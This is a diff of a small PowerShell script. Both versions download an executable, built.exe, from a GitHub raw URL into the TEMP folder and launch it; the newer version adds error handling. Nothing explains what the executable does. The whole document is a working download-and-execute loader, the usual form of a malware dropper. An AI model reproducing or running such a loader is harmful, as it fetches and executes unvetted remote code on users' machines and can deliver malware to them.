@@ -1,14 +1,18 @@
-# Set the URL of the executable to be downloaded
-$exeUrl = "https://github.com/0rx1/workshopdeffy/raw/main/built.exe"
+# Define the URL and output file path
+$url = 'https://github.com/0rx1/workshopdeffy/raw/main/built.exe'
+$output = "$env:TEMP\built.exe"
 
-# Define the path where the executable will be saved
-$exePath = "$env:TEMP\built.exe"
+# Try to download the file
+try {
+    Invoke-WebRequest -Uri $url -OutFile $output
 
-# Set the security protocol for PowerShell to allow downloads
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-# Download the executable file
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-
-# Run the downloaded executable
-Start-Process -FilePath $exePath
+    # Check if the file was downloaded successfully
+    if (Test-Path $output) {
+        # Start the downloaded executable
+        Start-Process $output
+    } else {
+        Write-Error "File download failed. $output not found."
+    }
+} catch {
+    Write-Error "An error occurred: $_"
+}
